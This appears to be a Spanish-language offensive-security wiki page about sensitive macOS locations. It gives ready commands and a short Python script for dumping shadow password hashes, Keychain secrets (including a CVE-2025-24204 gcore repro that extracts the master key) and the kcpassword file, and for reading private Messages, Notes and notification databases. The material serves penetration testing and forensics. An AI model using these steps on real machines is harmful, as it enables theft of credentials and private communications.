# macOS Sensitive Locations & Interesting Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Contraseñas

### Shadow Passwords

Shadow password se almacena con la configuración del usuario en plists ubicados en **`/var/db/dslocal/nodes/Default/users/`**.\
La siguiente oneliner se puede usar para volcar **toda la información sobre los usuarios** (incluida la información del hash):
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Scripts like this one**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) o [**this one**](https://github.com/octomagon/davegrohl.git) pueden usarse para transformar el hash a formato **hashcat**.

Una alternativa de una sola línea que volcará las credenciales de todas las cuentas que no sean de servicio en formato hashcat `-m 7100` (macOS PBKDF2-SHA512):
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Otra forma de obtener el `ShadowHashData` de un usuario es usando `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Este archivo se usa **solo** cuando el sistema se inicia en **single-user mode** (así que no es muy frecuente).

### Keychain Dump

Ten en cuenta que al usar el binario security para **dump the passwords decrypted**, aparecerán varios mensajes pidiendo al usuario que अनुमति esta operación.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
En macOS moderno, los backing stores más interesantes suelen ser **`~/Library/Keychains/login.keychain-db`** y **`/Library/Keychains/System.keychain`**. Son archivos respaldados por SQLite, pero el acceso en texto plano sigue mediado por **`securityd`**: robar la DB en bruto te da principalmente metadatos y blobs cifrados, a menos que también recuperes la contraseña del usuario, `SystemKey`, o una master key en memoria.

### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basado en este comentario [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) parece que estas herramientas ya no funcionan en Big Sur.

### Descripción general de Keychaindump

Se ha desarrollado una herramienta llamada **keychaindump** para extraer contraseñas de los keychains de macOS, pero presenta limitaciones en versiones más nuevas de macOS como Big Sur, tal y como se indica en una [discussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). El uso de **keychaindump** requiere que el atacante obtenga acceso y escale privilegios a **root**. La herramienta explota el hecho de que el keychain se desbloquea por defecto al iniciar sesión el usuario por conveniencia, permitiendo que las aplicaciones accedan a él sin necesitar repetidamente la contraseña del usuario. Sin embargo, si un usuario opta por bloquear su keychain después de cada uso, **keychaindump** se vuelve ineficaz.

**Keychaindump** opera apuntando a un proceso específico llamado **securityd**, descrito por Apple como un daemon para operaciones de autorización y criptográficas, crucial para acceder al keychain. El proceso de extracción implica identificar una **Master Key** derivada de la contraseña de inicio de sesión del usuario. Esta clave es esencial para leer el archivo del keychain. Para localizar la **Master Key**, **keychaindump** escanea el heap de memoria de **securityd** usando el comando `vmmap`, buscando posibles claves dentro de áreas marcadas como `MALLOC_TINY`. El siguiente comando se usa para inspeccionar estas ubicaciones de memoria:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Después de identificar posibles master keys, **keychaindump** busca en los heaps un patrón específico (`0x0000000000000018`) que indica un candidato para la master key. Se requieren pasos adicionales, incluida la deobfuscation, para utilizar esta key, como se detalla en el código fuente de **keychaindump**. Los analistas que se centran en esta área deben tener en cuenta que los datos cruciales para decrypting el keychain se almacenan dentro de la memoria del proceso **securityd**. Un comando de ejemplo para ejecutar **keychaindump** es:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) se puede usar para extraer los siguientes tipos de información de un keychain de OSX de forma forensemente sólida:

- Hashed Keychain password, suitable for cracking with [hashcat](https://hashcat.net/hashcat/) or [John the Ripper](https://www.openwall.com/john/)
- Internet Passwords
- Generic Passwords
- Private Keys
- Public Keys
- X509 Certificates
- Secure Notes
- Appleshare Passwords

Dada la contraseña de desbloqueo del keychain, una master key obtenida usando [volafox](https://github.com/n0fate/volafox) o [volatility](https://github.com/volatilityfoundation/volatility), o un archivo de desbloqueo como SystemKey, Chainbreaker también proporcionará contraseñas en texto plano.

Sin uno de estos métodos para desbloquear el Keychain, Chainbreaker mostrará toda la otra información disponible.

#### **Dump keychain keys**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) con SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar las claves de keychain (con contraseñas) crackeando el hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Volcar claves del llavero (con contraseñas) con un volcado de memoria**

[Sigue estos pasos](../index.html#dumping-memory-with-osxpmem) para realizar un **volcado de memoria**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Si conoces la contraseña del usuario, puedes usarla para **volcar y descifrar los keychains que pertenecen al usuario**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Clave maestra del Keychain mediante la entitlement `gcore` (CVE-2025-24204)

macOS 15.0 (Sequoia) incluyó `/usr/bin/gcore` con la **entitlement `com.apple.system-task-ports.read`**, así que cualquier administrador local (o app firmada maliciosa) podía volcar **la memoria de cualquier proceso incluso con SIP/TCC aplicados**. Volcar `securityd` leakea la **clave maestra del Keychain** en claro y te permite descifrar `login.keychain-db` sin la contraseña del usuario.

**Repro rápida en builds vulnerables (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Introduce la clave hex extraída en Chainbreaker (`--key <hex>`) para descifrar el keychain de login. Apple eliminó el entitlement en **macOS 15.3+**, así que esto solo funciona en builds de Sequoia sin parchear o en sistemas que conservaron el binario vulnerable.

### kcpassword

El archivo **kcpassword** es un archivo que contiene la **contraseña de inicio de sesión del usuario**, pero solo si el propietario del sistema ha **habilitado el inicio de sesión automático**. Por lo tanto, el usuario iniciará sesión automáticamente sin que se le pida una contraseña (lo cual no es muy seguro).

La contraseña se almacena en el archivo **`/etc/kcpassword`** xored con la clave **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Si la contraseña de los usuarios es más larga que la clave, la clave se reutilizará.\
Esto hace que la contraseña sea bastante fácil de recuperar, por ejemplo usando scripts como [**this one**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Información interesante en bases de datos

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Notifications

Antes de **Sequoia**, normalmente puedes encontrar el Notification Center store en **`$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db`**. En **Sequoia+** Apple lo movió al TCC-protected group container **`$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db`**.

La mayor parte de la información interesante se almacena dentro de columnas **blob**, así que tendrás que extraer ese contenido y transformarlo en algo legible para humanos (`plutil -p -`, `strings`, o un pequeño parser). Ejemplos de quick triage:
```bash
# Legacy location (older releases / affected builds)
DA=$(getconf DARWIN_USER_DIR)
strings "$DA/com.apple.notificationcenter/db2/db" | grep -i -A4 slack
sqlite3 "$DA/com.apple.notificationcenter/db2/db"   "select hex(data) from record order by delivered_date desc limit 1;" | xxd -r -p - | plutil -p -

# Sequoia+ location (TCC-protected)
sqlite3 "$HOME/Library/Group Containers/group.com.apple.usernoted/db2/db"   "select app_identifier, presented, datetime(delivered_date+978307200,'unixepoch'), hex(data) from record order by delivered_date desc limit 5;"
```
#### Recent privacy issues (NotificationCenter DB)

- En macOS **14.7–15.1** Apple almacenó el contenido de los banners en el SQLite `db2/db` sin redacción adecuada. Las CVEs **CVE-2024-44292/44293/40838/54504** permitían que cualquier usuario local leyera el texto de las notificaciones de otros usuarios simplemente abriendo la DB (sin prompt de TCC).
- Apple mitigó esto moviendo la DB a `group.com.apple.usernoted` y protegiéndola con TCC en builds más nuevas de Sequoia, así que en sistemas actuales normalmente necesitas el contexto de usuario correcto o un TCC bypass para leerla.
- En endpoints legacy, copia juntos los archivos `db`, `db-wal` y `db-shm` antes de actualizar o reiniciar si quieres preservar los artefactos.

### Notes

Las **notes** de los usuarios se pueden encontrar en `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

# ZICNOTEDATA.ZDATA is usually a gzip-compressed protobuf blob
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.z ; done
```
Si la línea única anterior es demasiado ruidosa, exporta `ZICNOTEDATA.ZDATA`, hazle gunzip y analiza el protobuf: normalmente esto es más fiable que ejecutar `strings` directamente sobre el SQLite.

### Background Tasks / Login Items

Desde **Ventura**, los login items aprobados por el usuario y varias background tasks se rastrean en almacenes **BTM** como **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm`** y la caché del sistema versionada **`/private/var/db/com.apple.backgroundtaskmanagement/BackgroundItems-v<xx>.btm`**.

Estos archivos son útiles para identificar rápidamente persistence, helper tools y algunos background items gestionados por MDM:
```bash
plutil -p ~/Library/Application\ Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm | head -100
sfltool dumpbtm
```
Para el ángulo de persistencia y los internals de BTM, consulta [the auto-start locations page](../../macos-auto-start-locations.md#login-items) y [the Background Tasks Management notes](../macos-security-protections/README.md#background-tasks-management).

## Preferences

En las apps de macOS, las preferencias están ubicadas en **`$HOME/Library/Preferences`** y en iOS están en `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

En macOS, la herramienta cli **`defaults`** se puede usar para **modificar el archivo Preferences**.

**`/usr/sbin/cfprefsd`** reclama los servicios XPC `com.apple.cfprefsd.daemon` y `com.apple.cfprefsd.agent` y puede llamarse para realizar acciones como modificar preferencias.

## OpenDirectory permissions.plist

El archivo `/System/Library/OpenDirectory/permissions.plist` contiene permisos aplicados sobre atributos de nodo y está protegido por SIP.\
Este archivo concede permisos a usuarios específicos por UUID (y no por uid) para que puedan acceder a información sensible específica como `ShadowHashData`, `HeimdalSRPKey` y `KerberosKeys` entre otros:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Notificaciones del Sistema

### Notificaciones Darwin

El daemon principal para notificaciones es **`/usr/sbin/notifyd`**. Para recibir notificaciones, los clientes deben registrarse a través del puerto Mach `com.apple.system.notification_center` (revísalos con `sudo lsmp -p <pid notifyd>`). El daemon se puede configurar con el archivo `/etc/notify.conf`.

Los nombres usados para las notificaciones son notaciones reverse DNS únicas y, cuando se envía una notificación a una de ellas, el/los cliente(s) que hayan indicado que pueden manejarla la recibirán.

Es posible volcar el estado actual (y ver todos los nombres) enviando la señal SIGUSR2 al proceso notifyd y leyendo el archivo generado: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Distributed Notification Center

El **Distributed Notification Center**, cuyo binario principal es **`/usr/sbin/distnoted`**, es otra forma de enviar notificaciones. Expone algunos servicios XPC y realiza algunas comprobaciones para intentar verificar clientes.

### Apple Push Notifications (APN)

En este caso, las aplicaciones pueden registrarse para **topics**. El cliente generará un token contactando con los servidores de Apple a través de **`apsd`**.\
Luego, los providers también habrán generado un token y podrán conectarse con los servidores de Apple para enviar mensajes a los clientes. Estos mensajes serán recibidos localmente por **`apsd`**, que retransmitirá la notificación a la aplicación que la esté esperando.

Las preferencias se encuentran en `/Library/Preferences/com.apple.apsd.plist`.

Hay una base de datos local de mensajes ubicada en macOS en `/Library/Application\ Support/ApplePushService/aps.db` y en iOS en `/var/mobile/Library/ApplePushService`. Tiene 3 tablas: `incoming_messages`, `outgoing_messages` y `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
También es posible obtener información sobre el daemon y las conexiones usando:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Notificaciones de usuario

Estas son notificaciones que el usuario debería ver en la pantalla:

- **`CFUserNotification`**: Estas API proporcionan una forma de mostrar en la pantalla un pop-up con un mensaje.
- **The Bulletin Board**: Esto muestra en iOS un banner que desaparece y se almacenará en el Notification Center.
- **`NSUserNotificationCenter`**: Esto es el Bulletin Board de iOS en MacOS. En versiones antiguas de macOS, la base de datos normalmente reside en `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`; en Sequoia+ se movió a `~/Library/Group Containers/group.com.apple.usernoted/db2/db`.

## Referencias

- **HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)**](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- **Apple Platform Security – Keychain data protection**](https://support.apple.com/guide/security/keychain-data-protection-secb0694df1a/web)
- **9to5Mac – Apple addresses privacy concerns around Notification Center database in macOS Sequoia**](https://9to5mac.com/2024/09/01/security-bite-apple-addresses-privacy-concerns-around-notification-center-database-in-macos-sequoia/)

{{#include ../../../banners/hacktricks-training.md}}
